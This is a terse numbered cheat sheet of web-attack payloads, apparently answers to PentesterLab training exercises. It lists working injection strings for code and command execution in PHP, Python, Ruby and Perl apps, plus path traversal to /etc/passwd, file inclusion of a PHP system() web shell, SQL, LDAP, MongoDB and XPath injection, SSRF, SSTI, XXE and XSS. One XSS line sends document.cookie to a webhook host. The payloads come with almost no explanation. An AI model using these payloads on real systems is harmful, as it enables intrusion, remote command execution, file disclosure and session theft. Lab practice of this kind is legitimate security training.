01 - Code Execution - PHP Eval() - URL/?name=".system('id').";#</br>
02 - Code Execution - SQL Request/PHP usort() - URL/?order=id);}system('uname -a');//</br>
03 - Code Execution - PHP(<5.5.0) preg_replace - URL/?new=<b>phpinfo()</b>&pattern=/lamer<b>/e</b>&base=Hello lamer</br>
04 - Code Execution - PHP assert - URL/?name=hacker'.phpinfo().'</br>
05 - Code Execution - Ruby App(PHP) - URL/?username="%2b\`id\`%2b" <b>(encoded and execute inside of ``)</b></br>
06 - Code Execution - Python App - URL/hello/hacker%22%2bstr(os.popen('id'))%2b%22 <b>(encoded)</b></br>
07 - Code Execution - Python App - URL/hello/hacker%22%2bstr(\_\_import__('os').popen('id').read())%2b%22</br>
08 - Code Execution - Python App - URL/hello/hacker%22%2bstr(\_\_import_\_('os').popen(\_\_import_\_('base64').b64decode('L3Vzci9sb2NhbC9iaW4vc2NvcmUgOTlkOTIyNTgtNGQ2My00Yzc3LTkwMDMtOGNiMGJjODU1YWEzCg==')).read())%2b%22</br>
09 - Code Execution - Perl App - URL/cgi-bin/hello?name=hacker%27.\`/usr/local/bin/score%2099d92258-4d63-4c77-9003-8cb0bc855aa3\`.%27</br></br>
10 - Command Execution - URL/?ip=\`/usr/local/bin/score%2099d92258-4d63-4c77-9003-8cb0bc855aa3\`</br>
11 - Command Execution - URL/?ip=$(/usr/local/bin/score%2099d92258-4d63-4c77-9003-8cb0bc855aa3)</br></br>
12 - Directory Traversal - URL/file.php?file=/var/www/../../../../etc/passwd <b>(our input must start with "/var/www/")</b></br>
13 - Directory Traversal - NULL BYTE - URL/file.php?file=../../../../etc/passwd%00</br></br>
14 - File Include - URL/?page=URL/test_include_system.txt&c=id <b>(test_include_system.txt \<?php system($\_GET['c']);\?>)</b></br>
15 - File Include - NULL BYTE - URL/?page=URL/test_include_system.txt%00&c=id</br></br>
16 - LDAP - NULL - Remove variables</br>
17 - LDAP - Injection - URL/?name=admin)(cn=\*))%00&password=admin </br></br>
18 - MongoDB Injection - URL/?username=admin%27%20||%201==1%20%00&password=&submit=Submit - (it could be --)</br>
19 - MongoDB Password Check (1) - URL/?search=admin%27%20%26%26%20this.password.match(/d/)%00</br>
20 - MongoDB Password Check (2) - URL/?search=admin%27%20%26%26%20this.password.match(/^d/)%00</br></br>
21 - Open Redirect - URL/redirect.php?uri=//google.com - <b>(//)</b></br></br>
20 - SQLi Bypass - admin' or 1=1 -- (' or '1'='1' || ' or '1'='1' -- || admin" or 1=1 -- || admin' or 1=1 LIMIT 1 -- ) <b>be careful with the spaces</b></br>
21 - SQLi Bypass - username=admin%27||1%3D1%23&password=admin</br>
22 - SQLi Bypass - username=admin%bf%27+or+1=1+--+&password=admin</br></br>
23 - SSRF - URL/?url=hxxp://127.0.0.1:1234 || URL/?url=hxxp://localhost:1234/ || URL/?url=hxxp://127.0.0.4:1234</br>
24 - SSRF - URL/?url=hxxp://assets.pentesterlab.com.hackingwithpentesterlab.link:1234/hacker.txt</br></br>
25 - SSTI - test{{1+2}} - URL/test%7B%7B''.\_\_class_\_.mro()[2].\_\_subclasses_\_()\[233](%22uname%20-a%22,shell=True)%7D%7D</br>
26 - SSTI - URL/?name={{\_self.env.registerUndefinedFilterCallback(%27exec%27)}}{{\_self.env.getFilter(%27uname%27)}}</br></br>
27 - XML - \<!DOCTYPE test \[\<\!ENTITY x SYSTEM "file:\///etc/passwd"\>]\><test>\%26x\;<\/test></br>
28 - XML - URL/?name=hacker%27%20or%201=1]/parent::*/child::node()\%00&password=pentesterlab</br></br>
29 - XSS - \<sc\<script>ript>alert(1)\<\/sc<\/script>ript></br>
30 - XSS - \<a onmouseover='alert(1)'>TEST\</a\></br>
31 - XSS - onerror: \<img src='zzzz' onerror='alert(1)' \/></br>
32 - XSS - URL/?name=\<script>eval("al"%2b"ert(1)")\<\/script></br>
33 - XSS - URL/?name=hacker';alert('99d92258-4d63-4c77-9003-8cb0bc855aa3');var b='</br>
34 - XSS - URL/index\.php/something"><script>alert(1)</script><</br>
35 - XSS - <script>document.write('<img src=\"WEBHOOK?c='\%2bdocument.cookie\%2b'" />');</script>






